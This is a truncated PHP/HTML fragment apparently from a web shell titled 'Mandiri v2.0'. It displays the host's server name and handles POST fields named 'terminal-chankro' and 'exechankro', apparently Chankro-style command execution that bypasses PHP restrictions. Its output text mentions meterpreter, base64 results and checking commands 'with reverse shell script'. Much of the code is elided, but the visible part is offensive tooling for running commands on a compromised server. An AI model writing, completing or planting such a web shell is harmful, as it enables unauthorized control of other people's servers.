...
<head>
    ...
    <title>Mandiri [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
            ...
            <div class="p-4">
                <div class="flex items-center justify-between mb-6 md:flex hidden">
                    <div class="flex items-center">
                        ...
                        <h1 class="text-xl font-bold cyber-font">Mandiri<span class="text-blue-400 cyber-glow">v2.0</span></h1>
                    </div>
                ...
                <?php
                    if (isset($_POST['terminal-chankro'])) {
                        ...
                        if(isset($_POST['exechankro'])){
                            ...
                            $viewCommandResult = '<hr><p>Result: base64 : ' . $meterpreter .'</br>If no output appears, <br>please check manually by opening '.$full_url.'<br>Or u can check command with reverse shell script<br>Powered By @ Mandiri<br><br>';        
